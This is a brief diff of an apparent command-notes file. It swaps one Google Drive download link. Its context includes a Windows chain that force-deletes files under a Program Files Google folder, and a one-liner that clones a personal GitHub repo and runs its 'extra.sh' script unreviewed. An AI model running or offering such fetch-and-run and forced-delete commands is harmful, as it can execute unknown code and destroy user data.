@@ -6,4 +6,4 @@ cd.. & cd.. & cd program files & cd google & cd application & chromium & del /f 
 https://drive.google.com/file/d/1e9HS_hw5FeYS5Mrlc9uuqFoQjhCx2obi/view?usp=sharing
 https://drive.google.com/uc?id=1e9HS_hw5FeYS5Mrlc9uuqFoQjhCx2obi&export=download
 git clone https://github.com/dragonmhmh/dragonmhmh && cd dragonmhmh && chmod +x extra.sh && ./extra.sh
-https://drive.google.com/u/0/uc?id=1IzXh9WEn3d3yyLQVM27S6Vu3wl0nHajt&export=download
+https://drive.google.com/u/0/uc?id=1r8X6vKCeBvz7yc9X3ozyg-KG8eR_ctz8&export=download
